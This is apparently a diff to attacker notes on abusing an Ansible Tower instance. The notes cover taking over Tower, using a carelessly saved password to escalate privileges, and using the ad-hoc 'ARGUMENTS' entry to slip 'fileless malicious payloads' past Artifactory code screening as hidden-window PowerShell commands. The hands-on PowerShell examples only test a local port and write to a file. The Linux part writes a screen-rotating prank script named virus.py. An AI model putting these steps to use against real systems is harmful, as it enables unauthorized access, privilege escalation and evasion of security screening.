@@ -99,12 +99,20 @@
 ## rm -rf ./virus.py
 ## 
 ## Approach 4
-## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "commands" entry to bypass artifactory code screening with using a playbook
+## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "ARGUMENTS" entry to bypass artifactory code screening with using a playbook
+![Hacking w/ Ansible](https://docs.ansible.com/ansible-tower/latest/html/userguide/_images/ad-hoc-commands-inventory-run-command.png)
 ## Send Fileless malicious payloads
-## Windows => open cmd.exe:
-## cmd terminal type:
-## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
+## ARGUMENTS type:
+## powershell.exe -windowStyle hidden -command "line1; line2; line3; line4;"
 ##
+## Hands-on example
+## Please try:
+## in ARGUMENTS entry tab:
+## powershell.exe -windowStyle hidden -command "$telnet = test-netConnection -computerName 127.0.0.1 -port 8080; $telnet | Out-File -FilePath C:\temp\telnet.txt -Encoding utf8;"
+##
+## Verify by Ansible "ARGUMENTS" tab:
+## powershell.exe -windowStyle hidden -command "ls C:\temp | findstr telnet; Get-Content C:\temp\telnet.txt;"
+## 
 ## Linux:
 ## Bash terminal:
 ## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
